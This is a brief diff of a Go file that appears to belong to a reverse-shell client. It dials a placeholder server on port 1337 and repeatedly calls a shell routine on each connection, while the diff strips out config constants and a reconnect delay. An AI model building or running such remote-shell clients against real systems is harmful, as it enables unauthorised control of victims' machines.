@@ -10,24 +10,6 @@ import (
 	"time"
 )
 
-const (
-	// serverDomain needs to be changed to your address
-	serverDomain = "domain.tld"
-	serverPort   = ":1337"
-	serverAddr   = serverDomain + serverPort
-)
-
-// serverCert needs to be changed to the TLS certificate of the server
-// intendation breaks the certificate
-const serverCert = `-----BEGIN CERTIFICATE-----
-____ CERTIFICATE GOES HERE | DONT INDENT ____
------END CERTIFICATE-----`
-
-type connection struct {
-	Conn    net.Conn
-	Sysinfo string
-}
-
 func connect() (net.Conn, error) {
 	conn, err := net.Dial("tcp", serverAddr)
 	if err != nil {
@@ -57,6 +39,5 @@ func NetClient() {
 		c := new(connection)
 		c.Conn = conn
 		c.shell()
-		time.Sleep(10 * time.Second)
 	}
 }
